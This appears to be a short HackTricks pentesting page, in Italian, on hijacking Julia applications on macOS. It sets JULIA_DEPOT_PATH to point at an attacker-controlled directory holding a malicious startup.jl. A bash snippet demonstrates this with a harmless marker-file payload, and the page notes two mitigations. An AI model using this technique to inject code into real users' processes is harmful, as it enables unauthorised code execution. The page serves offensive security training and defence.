# macOS Julia Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `JULIA_DEPOT_PATH` e `startup.jl`

Julia normalmente esegue `config/startup.jl` dal suo primo depot all'avvio. `JULIA_DEPOT_PATH` controlla l'elenco dei depot, quindi indirizzarlo verso un albero leggibile dall'attaccante reindirizza il file di startup caricato automaticamente.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```
Il separatore finale è utile quando la vittima ha ancora bisogno dei suoi pacchetti normali. `julia --startup-file=no` disabilita questo startup file. Cancella la variabile prima dell’avvio, perché controlla anche i registri dei pacchetti, gli ambienti, le cache e i percorsi per il caricamento del codice.

## References

- [1] [Julia command-line interface: File di avvio](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [2] [Julia environment variables: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
{{#include ../../../banners/hacktricks-training.md}}
